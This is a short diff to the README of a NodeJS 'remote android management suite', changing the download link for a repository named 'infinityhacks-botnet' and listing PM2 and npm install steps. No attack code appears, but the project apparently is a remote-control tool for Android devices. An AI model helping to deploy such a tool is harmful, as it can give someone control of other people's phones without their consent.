@@ -42,7 +42,7 @@ A cloud based remote android managment suite, powered by NodeJS
 3. install PM2 
     - `npm install pm2 -g`
 
-4. Download and Extract [HERE](https://github.com/ExtremeHacking/infinityhacks-botnet.git)
+4. Download and Extract [HERE](https://codeload.github.com/ExtremeHacking/infinityhacks-botnet/zip/master)
 
 5. In the extracted folder, run these commands
     - `npm install` <- install dependencies
